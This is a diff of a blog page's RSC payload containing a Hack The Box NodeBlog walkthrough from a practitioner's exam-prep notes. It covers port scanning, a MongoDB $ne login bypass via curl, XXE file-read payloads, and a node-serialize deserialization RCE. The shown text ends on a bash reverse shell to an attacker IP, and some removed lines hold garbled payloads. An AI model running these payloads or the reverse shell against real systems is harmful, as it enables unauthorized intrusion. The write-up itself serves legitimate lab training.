@@ -1,40 +1,38 @@
 1:"$Sreact.fragment"
 2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 3:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
-16:I[484,[],"OutletBoundary"]
-17:"$Sreact.suspense"
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-nodeblog-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: NodeBlog Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box NodeBlog machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:32:24.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[9," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-nodeblog-walkthrough.webp","width":800,"height":800,"alt":"Hack The Box NodeBlog machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official NodeBlog machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/nodeblog","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-web-application-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-application-enumeration","children":"Phase 2: Web Application Enumeration"}]}],["$","li","phase-3-nosql-injection-authentication-bypass",{"children":["$","a",null,{"href":"#phase-3-nosql-injection-authentication-bypass","children":"Phase 3: NoSQL Injection — Authentication Bypass"}]}],["$","li","phase-4-xxe-file-read",{"children":["$","a",null,{"href":"#phase-4-xxe-file-read","children":"Phase 4: XXE — File Read"}]}],"$L4","$L5","$L6","$L7","$L8"]}]]}],"$L9"],"$La","$Lb",["$Lc","$Ld","$Le"]]}],"$Lf"]}]]}],"$L10"]}],"$L11","$L12"],null,"$L13"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
-4:["$","li","phase-5-deserialization-rce-shell",{"children":["$","a",null,{"href":"#phase-5-deserialization-rce-shell","children":"Phase 5: Deserialization RCE — Shell"}]}]
-5:["$","li","phase-6-user-flag",{"children":["$","a",null,{"href":"#phase-6-user-flag","children":"Phase 6: User Flag"}]}]
-6:["$","li","phase-7-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-7-privilege-escalation-to-root","children":"Phase 7: Privilege Escalation to Root"}]}]
-7:["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}]
-8:["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]
-9:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",10," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-web-application-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-application-enumeration","children":"Phase 2: Web Application Enumeration"}]}],["$","li","phase-3-nosql-injection-authentication-bypass",{"children":["$","a",null,{"href":"#phase-3-nosql-injection-authentication-bypass","children":"Phase 3: NoSQL Injection — Authentication Bypass"}]}],["$","li","phase-4-xxe-file-read",{"children":["$","a",null,{"href":"#phase-4-xxe-file-read","children":"Phase 4: XXE — File Read"}]}],["$","li","phase-5-deserialization-rce-shell",{"children":["$","a",null,{"href":"#phase-5-deserialization-rce-shell","children":"Phase 5: Deserialization RCE — Shell"}]}],["$","li","phase-6-user-flag",{"children":["$","a",null,{"href":"#phase-6-user-flag","children":"Phase 6: User Flag"}]}],["$","li","phase-7-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-7-privilege-escalation-to-root","children":"Phase 7: Privilege Escalation to Root"}]}],["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}],["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]]}]}]]}]
-a:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3c8d275b9b54e1d0499a7314971aeb72d06f4929/HTB-NodeBlog.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 3c8d275b9b54",""]}]]]}]
-b:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["NodeBlog"," · Linux"," · Easy"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/nodeblog","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
-c:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box NodeBlog machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-d:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-e:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"15 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-14:T49de,
-<p><strong>Difficulty:</strong> Easy | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.96.160</p>
-<hr />
-<h2 id="the-hacker-mindset">The Hacker Mindset</h2>
-<p>Before touching a single tool, understand the goal: <strong>enumerate first, exploit second</strong>.<br />Every step builds on the last. You're not guessing — you're following the evidence.<br />The machine will tell you how to break it, if you ask the right questions.</p>
-<hr />
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: NodeBlog Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A MongoDB query-object login bypass led to XXE source disclosure and node-serialize cookie RCE, after which a plaintext database password gave the admin account unrestricted sudo access."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:32:24.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[9," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-nodeblog-walkthrough.webp","width":800,"height":800,"alt":"Hack The Box NodeBlog machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official NodeBlog machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/nodeblog","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-web-application-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-application-enumeration","children":"Phase 2: Web Application Enumeration"}]}],["$","li","phase-3-nosql-injection-authentication-bypass",{"children":["$","a",null,{"href":"#phase-3-nosql-injection-authentication-bypass","children":"Phase 3: NoSQL Injection: Authentication Bypass"}]}],["$","li","phase-4-xxe-file-read",{"children":["$","a",null,{"href":"#phase-4-xxe-file-read","children":"Phase 4: XXE: File Read"}]}],["$","li","phase-5-deserialization-rce-shell",{"children":["$","a",null,{"href":"#phase-5-deserialization-rce-shell","children":"Phase 5: Deserialization RCE: Shell"}]}],"$L4","$L5","$L6","$L7"]}]]}],"$L8"],"$L9","$La",["$Lb","$Lc","$Ld"]]}],"$Le"]}]]}],"$Lf"]}],"$L10","$L11"],null,"$L12"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
+4:["$","li","phase-6-user-flag",{"children":["$","a",null,{"href":"#phase-6-user-flag","children":"Phase 6: User Flag"}]}]
+5:["$","li","phase-7-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-7-privilege-escalation-to-root","children":"Phase 7: Privilege Escalation to Root"}]}]
+6:["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}]
+7:["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]
+8:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",9," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-web-application-enumeration",{"children":["$","a",null,{"href":"#phase-2-web-application-enumeration","children":"Phase 2: Web Application Enumeration"}]}],["$","li","phase-3-nosql-injection-authentication-bypass",{"children":["$","a",null,{"href":"#phase-3-nosql-injection-authentication-bypass","children":"Phase 3: NoSQL Injection: Authentication Bypass"}]}],["$","li","phase-4-xxe-file-read",{"children":["$","a",null,{"href":"#phase-4-xxe-file-read","children":"Phase 4: XXE: File Read"}]}],["$","li","phase-5-deserialization-rce-shell",{"children":["$","a",null,{"href":"#phase-5-deserialization-rce-shell","children":"Phase 5: Deserialization RCE: Shell"}]}],["$","li","phase-6-user-flag",{"children":["$","a",null,{"href":"#phase-6-user-flag","children":"Phase 6: User Flag"}]}],["$","li","phase-7-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-7-privilege-escalation-to-root","children":"Phase 7: Privilege Escalation to Root"}]}],["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}],["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]]}]}]]}]
+9:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3c8d275b9b54e1d0499a7314971aeb72d06f4929/HTB-NodeBlog.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 3c8d275b9b54",""]}]]]}]
+a:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["NodeBlog, Linux, Easy",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/nodeblog","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
+b:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box NodeBlog machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+c:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+d:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"7 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+13:T4818,<p><strong>Difficulty:</strong> Easy | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.96.160</p>
+<hr>
+
+<p>NodeBlog follows a direct sequence: enumerate first, then test the evidence.</p>
+<hr>
 <h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
-<h3 id="step-1-full-port-scan">Step 1 — Full Port Scan</h3>
+<h3 id="step-1-full-port-scan">Step 1: Full Port Scan</h3>
 <pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.96.160
 </code></pre>
-<p><strong>Why <code>-p-</code>?</strong><br />By default nmap only scans the top 1000 ports. Many CTF machines (and real targets) run services on non-standard ports. <code>-p-</code> scans all 65535 ports so nothing is missed.</p>
-<p><strong>Why <code>--min-rate 10000</code>?</strong><br />Speed. On HTB the machine is yours alone, so aggressive scanning is fine. This sends at least 10,000 packets per second instead of nmap's slow default.</p>
+<p><strong>Why <code>-p-</code>?</strong><br>By default nmap only scans the top 1000 ports. Many CTF machines (and real targets) run services on non-standard ports. <code>-p-</code> scans all 65535 ports so nothing is missed.</p>
+<p><strong>Why <code>--min-rate 10000</code>?</strong><br>Speed. On HTB the machine is yours alone, so aggressive scanning is fine. This sends at least 10,000 packets per second instead of nmap's slow default.</p>
 <p><strong>Result:</strong></p>
 <pre><code>22/tcp   open  ssh
 5000/tcp open  upnp
 </code></pre>
-<p><strong>What this tells us:</strong><br />Two ports. SSH on 22 is standard — usually only useful once we have credentials. Port 5000 is interesting — "upnp" is nmap's best guess but it could be anything. We investigate.</p>
-<hr />
-<h3 id="step-2-service-version-scan">Step 2 — Service Version Scan</h3>
+<p><strong>What this tells us:</strong><br>Two ports. SSH on 22 is standard - usually only useful once we have credentials. Port 5000 is interesting - "upnp" is nmap's best guess but it could be anything. We investigate.</p>
+<hr>
+<h3 id="step-2-service-version-scan">Step 2: Service Version Scan</h3>
 <pre><code class="language-bash" data-language="bash">nmap -p 22,5000 -sCV 10.129.96.160
 </code></pre>
 <p><strong>Why <code>-sCV</code>?</strong>  </p>
@@ -51,61 +49,61 @@ e:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <ul>
 <li>SSH version leaks the OS: Ubuntu 20.04 Focal. Filed away for later.</li>
 <li>Port 5000 is a <strong>Node.js Express web app</strong> called "Blog". This is our primary attack surface.</li>
-<li>Express is a minimal Node.js web framework — common in CTFs and known for certain vulnerability patterns.</li>
+<li>Express is a minimal Node.js web framework - common in CTFs and known for certain vulnerability patterns.</li>
 </ul>
-<p><strong>Hacker mindset:</strong> Technology fingerprinting tells you <em>what weapons to load</em>. Node.js + Express has a known ecosystem of vulnerabilities. You're already thinking: NoSQL injection (if MongoDB is behind it), deserialization (node-serialize), prototype pollution.</p>
-<hr />
+<p> Technology fingerprinting tells you <em>what weapons to load</em>. Node.js + Express has a known ecosystem of vulnerabilities. You're already thinking: NoSQL injection (if MongoDB is behind it), deserialization (node-serialize), prototype pollution.</p>
+<hr>
 <h2 id="phase-2-web-application-enumeration">Phase 2: Web Application Enumeration</h2>
-<h3 id="step-3-browse-the-site">Step 3 — Browse the Site</h3>
+<h3 id="step-3-browse-the-site">Step 3: Browse the Site</h3>
 <p>Visiting <code>http://10.129.96.160:5000</code> shows a blog. There's a <strong>Login</strong> button.</p>
-<p><strong>Why enumerate the login first?</strong><br />Authentication is the gatekeeper. Bypassing it gives you more functionality to attack. It's always step one with web apps.</p>
-<p><strong>What we see at <code>/login</code>:</strong><br />A standard username/password form. We try obvious credentials: <code>admin/admin</code>, <code>admin/password</code> — they fail, but the error message is important: "Invalid Password" (not "Invalid username"). This tells us <strong>admin is a valid username</strong>.</p>
-<p><strong>Hacker mindset:</strong> Error messages are information leaks. "Invalid Password" vs "Invalid Username/Password" confirms account existence.</p>
-<hr />
-<h2 id="phase-3-nosql-injection-authentication-bypass">Phase 3: NoSQL Injection — Authentication Bypass</h2>
-<h3 id="step-4-identify-the-backend">Step 4 — Identify the Backend</h3>
+<p><strong>Why enumerate the login first?</strong><br>Authentication is the gatekeeper. Bypassing it gives you more functionality to attack. It's always step one with web apps.</p>
+<p><strong>What we see at <code>/login</code>:</strong><br>A standard username/password form. We try obvious credentials: <code>admin/admin</code>, <code>admin/password</code> - they fail, but the error message is important: "Invalid Password" (not "Invalid username"). This tells us <strong>admin is a valid username</strong>.</p>
+<p> Error messages are information leaks. "Invalid Password" vs "Invalid Username/Password" confirms account existence.</p>
+<hr>
+<h2 id="phase-3-nosql-injection-authentication-bypass">Phase 3: NoSQL Injection: Authentication Bypass</h2>
+<h3 id="step-4-identify-the-backend">Step 4: Identify the Backend</h3>
 <p>Express + Node.js apps very commonly use <strong>MongoDB</strong> as their database (the "M" in the MEAN stack). MongoDB queries are JSON-based and vulnerable to a class of attack called <strong>NoSQL injection</strong>.</p>
-<h3 id="step-5-understanding-the-attack">Step 5 — Understanding the Attack</h3>
+<h3 id="step-5-understanding-the-attack">Step 5: Understanding the Attack</h3>
 <p>Normal login sends this POST body:</p>
 <pre><code>user=admin&amp;password=REDACTED
 </code></pre>
 <p>The server likely runs a MongoDB query like:</p>
-<pre><code class="language-javascript" data-language="javascript">db.users.findOne({ user: "admin", password: null })
+<pre><code class="language-javascript" data-language="javascript">db.users.findOne({ user: "admin", password: "REDACTED" })
 </code></pre>
 <p>If MongoDB receives a <strong>JSON object</strong> instead of a string for the password field, we can pass operators like <code>$ne</code> (not equal). The query becomes:</p>
-<pre><code class="language-javascript" data-language="javascript">db.users.findOne({ user: "admin", password: null $ne: "wrongpassword" } })
+<pre><code class="language-javascript" data-language="javascript">db.users.findOne({ user: "admin", password: { $ne: "wrongpassword" } })
 </code></pre>
-<p>This finds any user named <code>admin</code> whose password is REDACTED "wrongpassword" — which is every valid user. <strong>Auth bypassed.</strong></p>
+<p>This finds any user named <code>admin</code> whose password is <em>not</em> "wrongpassword" - which is every valid user. <strong>Auth bypassed.</strong></p>
 <p><strong>But there's a catch:</strong> The browser sends form data as <code>application/x-www-form-urlencoded</code>. To pass JSON objects, we need <code>Content-Type: application/json</code>.</p>
-<h3 id="step-6-execute-the-bypass">Step 6 — Execute the Bypass</h3>
+<h3 id="step-6-execute-the-bypass">Step 6: Execute the Bypass</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -i -X POST http://10.129.96.160:5000/login \
   -H 'Content-Type: application/json' \
-  -d '{"user": "admin", "password": null "wrongpassword"}}'
+  -d '{"user": "admin", "password": {"$ne": "wrongpassword"}}'
 </code></pre>
 <p><strong>Breaking it down:</strong></p>
 <ul>
-<li><code>-i</code> — show response headers (we need to see the cookie)</li>
-<li><code>-X POST</code> — force a POST request</li>
-<li><code>-H 'Content-Type: application/json'</code> — tell the server we're sending JSON</li>
-<li><code>-d '...'</code> — the JSON body with our <code>$ne</code> injection</li>
+<li><code>-i</code> : show response headers (we need to see the cookie)</li>
+<li><code>-X POST</code> : force a POST request</li>
+<li><code>-H 'Content-Type: application/json'</code> : tell the server we're sending JSON</li>
+<li><code>-d '...'</code> : the JSON body with our <code>$ne</code> injection</li>
 </ul>
 <p><strong>Result:</strong> The response contains:</p>
-<pre><code>Set-Cookie: null
+<pre><code>Set-Cookie: auth=REDACTED
 </code></pre>
 <p>URL-decoding that cookie gives us:</p>
-<pre><code class="language-json" data-language="json">{"user":"admin","sign":"[redacted retired-lab hash or flag]"}
+<pre><code class="language-json" data-language="json">{"user":"admin","sign":"REDACTED_HASH_OR_FLAG"}
 </code></pre>
 <p>We're logged in as admin.</p>
-<hr />
-<h2 id="phase-4-xxe-file-read">Phase 4: XXE — File Read</h2>
-<h3 id="step-7-explore-the-authenticated-app">Step 7 — Explore the Authenticated App</h3>
+<hr>
+<h2 id="phase-4-xxe-file-read">Phase 4: XXE: File Read</h2>
+<h3 id="step-7-explore-the-authenticated-app">Step 7: Explore the Authenticated App</h3>
 <p>Logged in, we see new features: "New Article", "Upload", "Edit", "Delete". The <strong>Upload</strong> button accepts files.</p>
-<p><strong>Hacker mindset:</strong> File upload = high value target. Always ask: what does the server <em>do</em> with the file? Parse it? Execute it? Store it?</p>
+<p> File upload = high value target. Always ask: what does the server <em>do</em> with the file? Parse it? Execute it? Store it?</p>
 <p>Sending a random file returns:</p>
 <pre><code>Invalid XML Example: &lt;post&gt;&lt;title&gt;...&lt;/title&gt;&lt;description&gt;...&lt;/description&gt;&lt;markdown&gt;...&lt;/markdown&gt;&lt;/post&gt;
 </code></pre>
 <p>The server expects <strong>XML</strong>. XML parsers are notoriously dangerous.</p>
-<h3 id="step-8-understanding-xxe">Step 8 — Understanding XXE</h3>
+<h3 id="step-8-understanding-xxe">Step 8: Understanding XXE</h3>
 <p><strong>XML External Entity (XXE)</strong> is a vulnerability where an XML parser processes attacker-controlled entity definitions. You can define an entity that references a local file, and the parser substitutes the file contents into the document.</p>
 <pre><code class="language-xml" data-language="xml">&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE data [
@@ -116,7 +114,7 @@ e:["$","div","editorial-correction-2",{"className":"article-review-note article-
 &lt;/post&gt;
 </code></pre>
 <p>Here, <code>&amp;file;</code> is replaced by the contents of <code>/etc/passwd</code> when the XML is parsed.</p>
-<h3 id="step-9-read-the-server-source-code">Step 9 — Read the Server Source Code</h3>
+<h3 id="step-9-read-the-server-source-code">Step 9: Read the Server Source Code</h3>
 <p>We know the app is Node.js, and common source file names are <code>server.js</code>, <code>index.js</code>, <code>app.js</code>. We target <code>/opt/blog/server.js</code> (a common deployment path on Linux).</p>
 <pre><code class="language-bash" data-language="bash">cat &gt; /tmp/xxe.xml &lt;&lt; 'EOF'
 &lt;?xml version="1.0"?&gt;
@@ -131,7 +129,7 @@ e:["$","div","editorial-correction-2",{"className":"article-review-note article-
 EOF
 
 curl -s -X POST http://10.129.96.160:5000/articles/xml \
-  -H "Cookie: null \
+  -H "Cookie: auth=REDACTED" \
   -F "file=@/tmp/xxe.xml"
 </code></pre>
 <p><strong>Result:</strong> The <code>markdown</code> textarea in the response contains the full <code>server.js</code> source. Key findings:</p>
@@ -143,11 +141,11 @@ function authenticated(c) {
     if (c.sign == ...) { return true }
 }
 </code></pre>
-<p><strong>Why is this critical?</strong><br /><code>node-serialize.unserialize()</code> is being called on the raw value of the <code>auth</code> cookie <strong>before</strong> any validation. This means whatever we put in that cookie gets deserialized. This is the vulnerability.</p>
-<hr />
-<h2 id="phase-5-deserialization-rce-shell">Phase 5: Deserialization RCE — Shell</h2>
-<h3 id="step-10-understanding-node-serialize">Step 10 — Understanding node-serialize</h3>
-<p>The <code>node-serialize</code> library has a known vulnerability: if a serialized object contains a function marked with the special prefix <code>_$$ND_FUNC$$_</code>, and that function is immediately invoked (IIFE — Immediately Invoked Function Expression), it executes arbitrary code during deserialization.</p>
+<p><strong>Why is this critical?</strong><br><code>node-serialize.unserialize()</code> is being called on the raw value of the <code>auth</code> cookie <strong>before</strong> any validation. This means whatever we put in that cookie gets deserialized. This is the vulnerability.</p>
+<hr>
+<h2 id="phase-5-deserialization-rce-shell">Phase 5: Deserialization RCE: Shell</h2>
+<h3 id="step-10-understanding-node-serialize">Step 10: Understanding node-serialize</h3>
+<p>The <code>node-serialize</code> library has a known vulnerability: if a serialized object contains a function marked with the special prefix <code>_$$ND_FUNC$$_</code>, and that function is immediately invoked (IIFE - Immediately Invoked Function Expression), it executes arbitrary code during deserialization.</p>
 <p><strong>Normal serialized object:</strong></p>
 <pre><code class="language-json" data-language="json">{"user": "admin"}
 </code></pre>
@@ -155,13 +153,13 @@ function authenticated(c) {
 <pre><code class="language-json" data-language="json">{"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()"}
 </code></pre>
 <p>The <code>()</code> at the end of the function makes it execute immediately when unserialized.</p>
-<h3 id="step-11-craft-the-reverse-shell-payload">Step 11 — Craft the Reverse Shell Payload</h3>
+<h3 id="step-11-craft-the-reverse-shell-payload">Step 11: Craft the Reverse Shell Payload</h3>
 <p>A direct bash reverse shell has characters that break URL encoding. The safe approach is to base64-encode the shell command, then decode and execute it server-side.</p>
 <p><strong>The reverse shell command:</strong></p>
 <pre><code class="language-bash" data-language="bash">bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1
